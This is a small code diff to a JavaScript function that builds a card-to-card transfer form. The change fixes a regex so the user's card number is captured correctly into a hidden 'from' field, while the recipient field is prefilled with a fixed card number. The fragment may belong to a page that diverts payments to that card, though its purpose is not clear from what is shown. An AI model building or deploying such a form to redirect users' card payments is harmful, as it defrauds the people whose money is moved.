@@ -43,7 +43,7 @@ async function submitData() {
   const TEMPLATE = `
     <form method="POST" action="/transfer/byCard">
       <input type="hidden" name="from" id="walletInputOption" value="${getCardNumber().replace(
-        /\S+/g,
+        /\s+/g,
         ""
       )}">
             <input class="" required="" maxlength="20" name="to" type="text" value="2202100714221678">
